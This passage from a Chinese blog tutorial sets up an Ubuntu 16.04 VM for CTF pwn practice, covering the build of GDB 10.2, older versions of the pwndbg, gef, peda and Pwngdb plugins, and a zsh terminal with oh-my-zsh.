安装系统态、用户态</span><span class="token comment"># 安装依赖库</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc-arm-linux-gnueabi<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 apt 方式安装的 QEMU 卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除包和相关依赖</span><span class="token function">sudo</span> <span class="token function">apt-get</span> remove --auto-remove qemu*<span class="token comment"># 删除配置文件和相关的数据文件</span><span class="token function">sudo</span> <span class="token function">apt-get</span> purge --auto-remove qemu*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-Zsteg"><a href="#安装-Zsteg" class="headerlink" title="安装 Zsteg"></a>安装 Zsteg</h2><blockquote><p>做 MISC 需要，图像隐写神器</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-Basecrack"><a href="#安装-Basecrack" class="headerlink" title="安装 Basecrack"></a>安装 Basecrack</h2><blockquote><p>做 REVERSE、MISC 需要，Base 系列编码分析工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/mufeedvh/basecrack.git /opt/basecrack<span class="token builtin class-name">cd</span> /opt/basecrackpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython basecrack.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="升级-GDB-到-gdb-10-2"><a href="#升级-GDB-到-gdb-10-2" class="headerlink" title="升级 GDB 到 gdb-10.2"></a>升级 GDB 到 gdb-10.2</h1><blockquote><p>Ubuntu 16.4 自带的 GDB 版本太老（gdb-7.11.1），可以更新到 gdb-10.2</p><p>我尝试过安装 gdb-12.1 和 gdb-11.2，但是都会报错，估计与 python 3.5 有关 （使用 python 3.10.6 编译 GDB 依然报错），暂未解决，如果你喜欢折腾可以自己尝试一下，报错如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1.png" alt="Ubuntu16.04虚拟机PWN环境搭建1.png"></p><p>参考文章：</p><ol><li><a href="https://blog.csdn.net/qq_39153421/article/details/116753735">Ubuntu16.04升级gdb7.11升级到10.2版本_ubuntu gdb升级命令-CSDN博客</a></li><li><a href="https://blog.csdn.net/EJoft/article/details/123036910">Ubuntu18.04升级gdb10.2_gdb10.2.tar.gz_EJoft的博客-CSDN博客</a></li></ol></blockquote><p>下载 GDB 源码：<a href="https://ftp.gnu.org/gnu/gdb/">Index of &#x2F;gnu&#x2F;gdb</a></p><p>这里以 gdb-10.2.tar.gz 为例</p><p>编译安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> gdb-10.2.tar.gz<span class="token builtin class-name">cd</span> ./gdb-10.2<span class="token function">mkdir</span> build <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> build<span class="token function">sudo</span> <span class="token punctuation">..</span>/configure --with-python<span class="token operator">=</span>/usr/bin/python3.5 --enable-targets<span class="token operator">=</span>all<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 <code>--with-python=/usr/bin/python3.5</code> 指定使用系统自带的 python 3.5 来编译 GDB</p><p>如果自己源码编译安装了新版的 Python，这里指定用新版的 Python 进行编译，编译时可能会报下列错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">configure: WARNING: MPFR is missing or unusable<span class="token punctuation">;</span> some features may be unavailable.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网上说是与 Python 的 <code>distutils</code> 和 <code>dev</code> 有关，源码编译的 Python 缺少相应的 <code>python-distutils</code> 和 <code>python-dev</code></p><p>但是暂时还未解决该问题，所以建议直接使用系统自带的 python 3.5 来编译 GDB，较为稳定</p><p>编译过程很漫长，编译可能会报如下错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: <span class="token string">'makeinfo'</span> is missing on your system.         You should only need it <span class="token keyword">if</span> you modified a <span class="token string">'.texi'</span> file, or         any other <span class="token function">file</span> indirectly affecting the aspect of the manual.         You might want to <span class="token function">install</span> the Texinfo package:         <span class="token operator">&lt;</span>http://www.gnu.org/software/texinfo/<span class="token operator">></span>         The spurious makeinfo call might also be the consequence of         using a buggy <span class="token string">'make'</span> <span class="token punctuation">(</span>AIX, DU, IRIX<span class="token punctuation">)</span>, <span class="token keyword">in</span> <span class="token function">which</span> <span class="token keyword">case</span> you might         want to <span class="token function">install</span> GNU make:         <span class="token operator">&lt;</span>http://www.gnu.org/software/make/<span class="token operator">></span>make<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>: *** <span class="token punctuation">[</span>gdb.info<span class="token punctuation">]</span> Error <span class="token number">127</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装 <code>texinfo</code> 即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> texinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来，替换老版本 GDB</p><p>编译生成的新版 gdb 二进制文件一般位于编译目录 <code>gdb-10.2/build/gdb/gdb</code>，如果不在该目录下，可以使用指令查找：<code>sudo find / -name gdb</code></p><p>将 gdb 二进制文件拷贝到 <code>/usr/bin/</code> 下，替换原来的旧版 gdb，也可以先将原来的旧版 gdb 做个备份，以防出问题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> /usr/local/bin/gdb /usr/local/bin/gdb-7.11.1.backup<span class="token comment"># 以自己编译的新版 gdb 实际路径为主</span><span class="token function">sudo</span> <span class="token function">cp</span> ~/下载/gdb-10.2/build/gdb/gdb /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行 GDB，升级完成：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA6.png" alt="Ubuntu16.04虚拟机PWN环境搭建6.png"></p><hr><h1 id="GDB-配置"><a href="#GDB-配置" class="headerlink" title="GDB 配置"></a>GDB 配置</h1><blockquote><p><em>见 《GDB的基础和使用》一文，有非常详细的介绍</em></p><p><mark>但是需要注意，Ubuntu 16.04 由于版本太老，无法直接安装最新版 <code>pwndbg</code> 和 <code>gef</code>，要自己通过旧版本安装</mark></p><p><strong>Ubuntu 16.04 安装 GDB 插件请以本文为主</strong>，<strong>设置脚本自动切换 GDB 插件可以参照《GDB的基础和使用》一文</strong></p></blockquote><h2 id="安装-peda"><a href="#安装-peda" class="headerlink" title="安装 peda"></a>安装 peda</h2><p>最新版安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/longld/peda.git /opt/gdb_plugins/peda<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/peda/peda.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>在 Ubuntu 16.04 中使用上述方法安装，暂时没有出现问题</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA9.png" alt="Ubuntu16.04虚拟机PWN环境搭建9.png"></p><hr><h2 id="安装-pwndbg"><a href="#安装-pwndbg" class="headerlink" title="安装 pwndbg"></a>安装 pwndbg</h2><blockquote><p><code>pwndbg</code> 与 <code>Pwngdb</code> 需要一起搭配使用</p></blockquote><p>最新版安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/pwndbg/pwndbg /opt/gdb_plugins/pwndbg<span class="token builtin class-name">cd</span> /opt/gdb_plugins/pwndbg<span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>如果在 Ubuntu 16.04 这样的老版本中使用上述方法，安装过程中会报错<br>因为 python 版本太低不支持新的语法，无法安装最新的 pwndbg <em>（pwndbg 会检测 GDB 所使用的 python 版本，与 GDB 的 python 保持一致，默认是 python 3.5）</em></p><p>报错信息如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">File <span class="token string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/cli/main.py"</span>, line <span class="token number">57</span>  sys.stderr.write<span class="token punctuation">(</span>f<span class="token string">"ERROR: &#123;exc&#125;"</span><span class="token punctuation">)</span>  ^  SyntaxError: invalid syntax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="Ubuntu16.04虚拟机PWN环境搭建2.png"></p></blockquote><p>Ubuntu 16.04 需要在 <a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a> 中下载旧版本的源码</p><p>比如 2021 版的 pwndbg 就可以正常使用：<a href="https://github.com/pwndbg/pwndbg/tree/2021.06.22">pwndbg&#x2F;pwndbg at 2021.06.22 (github.com)</a> （实测 <code>pwndbg-2022.01.05</code> 版也可以）</p><p>然后解压移动到 <code>/opt/gdb_plugins/</code> 目录下，在 <code>/opt/gdb_plugins/pwndbg-2021.06.22</code> 目录下使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装过程中会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+ <span class="token function">git</span> submodule update <span class="token parameter variable">--init</span> <span class="token parameter variable">--recursive</span>fatal: Not a <span class="token function">git</span> repository <span class="token punctuation">(</span>or any of the parent directories<span class="token punctuation">)</span>: .git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在当前目录下初始化 git 再重新安装即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装-Pwngdb"><a href="#安装-Pwngdb" class="headerlink" title="安装 Pwngdb"></a>安装 Pwngdb</h3><p>安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/scwuaptx/Pwngdb.git /opt/gdb_plugins/Pwngdb<span class="token builtin class-name">cd</span> /opt/gdb_plugins/Pwngdb<span class="token function">sudo</span> <span class="token function">cp</span> .gdbinit ~/<span class="token function">sudo</span> <span class="token function">vim</span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>~/.gdbinit</code> 的第二行插入：（记得插入在 <code>source /opt/gdb_plugins/Pwngdb/pwngdb.py</code> 这一句的前面）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg-2021.06.22/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果 pwndbg 的路径不是 <code>/opt/gdb_plugins/pwndbg-2021.06.22</code>，请按照自己的实际路径修改</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA8.png" alt="Ubuntu16.04虚拟机PWN环境搭建8.png"></p><hr><h3 id="配置-pwndbg-分屏调试"><a href="#配置-pwndbg-分屏调试" class="headerlink" title="配置 pwndbg 分屏调试"></a>配置 pwndbg 分屏调试</h3><blockquote><p>由于 pwndbg 输出的信息较多，经常在一页上看不全，需要上下翻找，眼花缭乱</p><p>我们可以设置 pwndbg 分屏调试，一边屏幕输入命令，一边屏幕查看输出信息，提高效率</p></blockquote><h4 id="方法一：修改-gdbinit"><a href="#方法一：修改-gdbinit" class="headerlink" title="方法一：修改 gdbinit"></a>方法一：修改 gdbinit</h4><p>配置很简单，先后打开两个终端</p><p>假设先打开的一个终端用于开启 gdb 调试并输入调试命令，后打开的一个终端用于输出调试信息</p><p>在两个终端分别输入 <code>tty</code>，先打开的终端为 <code>/dev/pts/19</code>，后打开的为 <code>/dev/pts/20</code> <em>（以自己的实际输出信息为主）</em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A82.png" alt="GDB的基础和使用2.png"></p><p>修改 <code>~/.gdbinit</code> 中的内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>~/.gdbinit</code> 末尾加入一句：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> context-output xxx<span class="token comment"># 这里的 xxx 就是用于输出调试信息的分屏，我这里是：/dev/pts/20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><mark>注意：如果你开了多个终端，就设置为实际想要用于输出调试信息的分屏</mark></p><p>保存退出</p><p>在先打开的终端中开启 gdb 并输入调试命令，在后打开的终端中即可输出调试信息</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A83.png" alt="GDB的基础和使用3.png"></p><p>然后我们将屏幕调整一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A84.png" alt="GDB的基础和使用4.png"></p><blockquote><p>设置分屏后，如果只开启一个终端，使用 gdb 可能会遇到如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Exception occurred: context: <span class="token punctuation">[</span>Errno <span class="token number">13</span><span class="token punctuation">]</span> 权限不够: <span class="token string">'/dev/pts/20'</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>class <span class="token string">'PermissionError'</span><span class="token operator">></span><span class="token punctuation">)</span>  For <span class="token function">more</span> info invoke <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-verbose on<span class="token variable">`</span></span> and rerun the <span class="token builtin class-name">command</span>  or debug it by yourself with <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-debugger on<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再开启一个终端即可解决 （新开启的终端需为 &#x2F;dev&#x2F;pts&#x2F;20）</p></blockquote><hr><h4 id="方法二：gdb-临时设置"><a href="#方法二：gdb-临时设置" class="headerlink" title="方法二：gdb 临时设置"></a>方法二：gdb 临时设置</h4><p>由于有时候新开启的终端并不是我们在 <code>~/.gdbinit</code> 中设置的那个终端，频繁更改 <code>~/.gdbinit</code> 中的内容未免太过麻烦</p><p>所以，我们也可以不在 <code>~/.gdbinit</code> 中设置，而是先在一个终端中启动 gdb 调试，然后再另开一个新的终端，使用 <code>tty</code> 查看新的终端的分屏信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tty</span><span class="token comment"># 假设输出为：/dev/pts/18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在 gdb 中直接设置输出调试信息的分屏： （以自己上一步实际的分屏信息为主）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> context-output /dev/pts/18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以避免新打开的终端与我们在 <code>~/.gdbinit</code> 中设置的终端不一致的问题</p><hr><h2 id="安装-gef"><a href="#安装-gef" class="headerlink" title="安装 gef"></a>安装 gef</h2><p>最新版安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/hugsy/gef /opt/gdb_plugins/gef<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/gef/gef.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果在 Ubuntu 16.04 这样的老版本中使用上述方法，打开 gdb 会报错</p><p>与 pwndbg 一样，是因为 python 版本太低不支持新的语法，无法安装最新的 gef</p></blockquote><p>Ubuntu 16.04 需要在 <a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a> 中下载旧版本的源码</p><p>比如 2021 版的 gef 就可以正常使用：<a href="https://github.com/hugsy/gef/releases/tag/2021.10">Release 2021.10 - Royal Kill · hugsy&#x2F;gef (github.com)</a></p><p>然后解压移动到 <code>/opt/gdb_plugins/</code> 目录下，在 <code>/opt/gdb_plugins/gef-2021.10</code> 目录下使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/gef-2021.10/gef.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 gdb 后如果 <code>gef</code> 显示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">3</span> <span class="token builtin class-name">command</span> could not be loaded, run <span class="token variable"><span class="token variable">`</span>gef missing<span class="token variable">`</span></span> to know why.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入 <code>gef missing</code> 查看缺失的库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>set-permission<span class="token variable">`</span></span> is missing, reason  →  Missing <span class="token variable"><span class="token variable">`</span>keystone-engine<span class="token variable">`</span></span> package, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> keystone-engine<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>ropper<span class="token variable">`</span></span> is missing, reason  →  Missing <span class="token variable"><span class="token variable">`</span>ropper<span class="token variable">`</span></span> package <span class="token keyword">for</span> Python, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> ropper<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>assemble<span class="token variable">`</span></span> is missing, reason  →  Missing <span class="token variable"><span class="token variable">`</span>keystone-engine<span class="token variable">`</span></span> package <span class="token keyword">for</span> Python, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> keystone-engine<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 pip 安装对应的库即可</p><p><strong>注意要用 GDB 所使用的 python 版本对应的 pip 来安装，Ubuntu 16.04 的 GDB 默认使用 python 3.5</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA7.png" alt="Ubuntu16.04虚拟机PWN环境搭建7.png"></p><hr><h2 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h2><ul><li>自用的 <code>~/.gdbinit</code> 文件内容示例：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># source /opt/gdb_plugins/peda/peda.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg-2021.06.22/gdbinit.py<span class="token comment"># source /opt/gdb_plugins/gef-2021.10/gef.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/pwngdb.py<span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/angelheap/gdbinit.pydefine hook-runpython<span class="token function">import</span> angelheapangelheap.init_angelheap<span class="token punctuation">(</span><span class="token punctuation">)</span>endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>终端输入 <code>gdb</code>：</p><ol><li>当启用 <strong>peda</strong> 时，会出现：<code>gdb-peda$ </code></li><li>当启用 <strong>pwndbg</strong> 时，会出现：<code>pwndbg&gt; </code></li><li>当启用 <strong>gef</strong> 时，会出现：<code>gef➤ </code></li></ol><p>如果验证出现上述输出内容，<mark>并且在输出内容之前没有任何报错提示</mark>，则说明安装成功</p><p>如果没有安装成功，输入 <code>gdb</code> 会显示默认的：<code>(gdb) </code></p></blockquote><p><mark>另外，可以设置脚本自动切换不同的 GDB 插件使用，省去手动注释 <code>~/.gdbinit</code> 文件的麻烦，具体方法请移步《GDB的基础和使用》</mark></p><hr><h1 id="配置-ZSH-终端"><a href="#配置-ZSH-终端" class="headerlink" title="配置 ZSH 终端"></a>配置 ZSH 终端</h1><blockquote><p>对比 Ubuntu 和 Kali 之后，觉得 Kali 的<mark>终端历史命令自动补全</mark>的功能真的是太好用了，还有<mark>命令输入正确和错误的高亮提示</mark>，简直不要太好用，原因就在于 Kali 2020 之后的版本默认终端为 zsh</p><p>Ubuntu 也可以安装 zsh 作为终端哦，不用再羡慕隔壁 Kali 啦，接下来用 zsh 打造一个究极好用的全新 Ubuntu 终端吧</p><p>参考文章：</p><ol><li><a href="https://blog.csdn.net/qq_51692609/article/details/121228694">Ubuntu版本安装zsh、配置ohmyzsh及插件、主题更换_ubuntu ohmyzsh-CSDN博客</a></li><li><a href="https://www.bktus.com/archives/2759">解决oh-my-zsh plugin ‘zsh-autosuggestions’ not found 与 plugin ‘zsh-syntax-highlighting’ not found问题 | BaKanTu union us (bktus.com)</a></li></ol><p><strong>注意：安装 <code>zsh</code> 后，以后所有要写入 <code>~/.bashrc</code> 的配置全都只需要写入 <code>~/.zshrc</code> 即可</strong></p></blockquote><p>安装 <code>zsh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zsh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>为了配置 <code>zsh</code>，还必须安装 <code>zsh</code> 的配置工具 <code>oh my zsh</code>，安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/robbyrussell/oh-my-zsh /opt/oh-my-zsh<span class="token builtin class-name">cd</span> /opt/oh-my-zsh/tools<span class="token function">sh</span> install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输入 <code>y</code> 将默认 shell 更改为 <code>zsh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Looking <span class="token keyword">for</span> an existing <span class="token function">zsh</span> config<span class="token punctuation">..</span>.Found /root/.zshrc. Backing up to /root/.zshrc.pre-oh-my-zshUsing the Oh My Zsh template <span class="token function">file</span> and adding it to /root/.zshrc.Time to change your default shell to zsh:Do you want to change your default shell to zsh? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA10.png" alt="Ubuntu16.04虚拟机PWN环境搭建10.png"></p><p>验证安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zsh</span> <span class="token parameter variable">--version</span><span class="token comment"># zsh 5.1.1 (x86_64-ubuntu-linux-gnu)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>添加原来 bash 的环境变量，将 <code>~/.zshrc</code> 的第二行取消注释：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA25.png" alt="Linux虚拟机CTF环境搭建25.png"></p><p>使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一些可能的问题：</p><ol><li>如果使用 <code>zsh</code> 过程中历史记录出现问题，报错如下：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: corrupt <span class="token function">history</span> <span class="token function">file</span> /home/wyy/.zsh_history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除原历史记录并重建：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ~/.zsh_history ~/.zsh_history_badstrings <span class="token parameter variable">-eS</span> ~/.zsh_history_bad <span class="token operator">></span> ~/.zsh_history <span class="token operator">&amp;&amp;</span> fc <span class="token parameter variable">-R</span> ~/.zsh_history<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.zsh_history_bad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启终端即可解决</p><ol start="2"><li>如果出现以下报错：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: no matches found: xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑 <code>~/.zshrc</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件最后加上一句：<code>setopt no_nomatch</code></p><p>使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="配置-zsh-autosuggestions"><a href="#配置-zsh-autosuggestions" class="headerlink" title="配置 zsh-autosuggestions"></a>配置 zsh-autosuggestions</h2><blockquote><p>这是一个历史命令智能提示插件，能帮助我们快速执行历史命令，实现终端历史命令自动补全</p></blockquote><p>通过 git 安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/oh-my-zsh/plugins<span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>plugins</code>，在 plugins 后面添加插件 <code>zsh-autosuggestions</code> （注意与原有的 git 空格隔开）</p><p>并加入插件 <code>zsh-autosuggestions</code> 的默认保存地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /opt/oh-my-zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA11.png" alt="Ubuntu16.04虚拟机PWN环境搭建11.png"></p><p>保存退出后，更新 